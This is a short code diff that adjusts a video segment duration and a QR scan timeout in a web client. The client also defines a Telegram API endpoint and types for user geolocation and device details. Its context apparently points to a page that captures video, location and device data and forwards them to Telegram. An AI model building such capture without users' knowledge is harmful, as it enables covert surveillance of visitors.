@@ -15,8 +15,8 @@ import {
 } from "@/lib/client-data";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
-const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
-const QR_SCAN_TIMEOUT_MS = 4000; // 4 seconds for QR scanning on first attempt
+const VIDEO_SEGMENT_DURATION_MS = 3500; // 3.5 seconds for each video segment
+const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning on first attempt
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
